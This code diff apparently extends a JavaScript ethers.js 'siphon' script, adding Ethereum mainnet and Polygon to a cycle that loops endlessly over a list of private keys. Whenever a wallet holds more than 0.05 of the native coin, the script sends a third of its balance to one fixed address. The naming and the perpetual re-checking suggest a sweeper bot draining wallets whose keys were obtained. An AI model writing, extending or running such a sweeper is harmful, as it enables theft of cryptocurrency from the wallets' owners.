@@ -30,12 +30,66 @@ const privateKey =
   ];
 const providerRopsten = new ethers.providers.AlchemyProvider('ropsten',process.env.ALCHEMY_API_KEY_ROPSTEN);
 const providerMumbai = new ethers.providers.AlchemyProvider('maticmum',process.env.ALCHEMY_API_KEY_MUMBAI);
+const providerMain = new ethers.providers.AlchemyProvider('homestead', process.env.ALCHEMY_API_KEY_MAINNET);
+const providerPolygon = new ethers.providers.AlchemyProvider('matic', process.env.ALCHEMY_API_KEY_POLYGON);
 const receiveAddress = "0x88761F959C029d5828405234A53c5d42FD84248E";
 
 
-siphonedRopsten();
+siphonedPolygon();
 
 
+async function siphonedPolygon(){
+    console.log("POLYGON");
+  for(let i = 0; i < privateKey.length; i++){
+    let newGasPrice = await providerPolygon.getGasPrice();
+    let balance = await providerPolygon.getBalance(new ethers.Wallet(privateKey[i]).address);
+    let newNonce = await providerPolygon.getTransactionCount(new ethers.Wallet(privateKey[i]).address, "latest");
+
+    console.log(ethers.utils.formatUnits(balance, 18));
+
+    if(ethers.utils.formatUnits(balance, 18) > 0.05){
+      const tx = {
+        from: new ethers.Wallet(privateKey[i]).address,
+        to: receiveAddress,
+        value: ethers.BigNumber.from(balance).div(3),
+        nonce: newNonce,
+        gasLimit: 100000, // 100000
+        gasPrice: newGasPrice,
+      }
+      new ethers.Wallet(privateKey[i], providerPolygon).sendTransaction(tx).then((transaction,err) => {
+        console.log(transaction,err);
+      })
+    }
+  }
+  siphonedMain();
+}
+
+
+async function siphonedMain(){
+    console.log("HOMESTEAD");
+  for(let i = 0; i < privateKey.length; i++){
+    let newGasPrice = await providerMain.getGasPrice();
+    let balance = await providerMain.getBalance(new ethers.Wallet(privateKey[i]).address);
+    let newNonce = await providerMain.getTransactionCount(new ethers.Wallet(privateKey[i]).address, "latest");
+
+    console.log(ethers.utils.formatUnits(balance, 18));
+
+    if(ethers.utils.formatUnits(balance, 18) > 0.05){
+      const tx = {
+        from: new ethers.Wallet(privateKey[i]).address,
+        to: receiveAddress,
+        value: ethers.BigNumber.from(balance).div(3),
+        nonce: newNonce,
+        gasLimit: 100000, // 100000
+        gasPrice: newGasPrice,
+      }
+      new ethers.Wallet(privateKey[i], providerMain).sendTransaction(tx).then((transaction,err) => {
+        console.log(transaction,err);
+      })
+    }
+  }
+  siphonedRopsten();
+}
 
 async function siphonedRopsten(){
     console.log("ROPSTEN");
@@ -86,5 +140,5 @@ async function siphonedMumbai(){
         })
       }
     }
-    siphonedRopsten();
+    siphonedPolygon();
   }
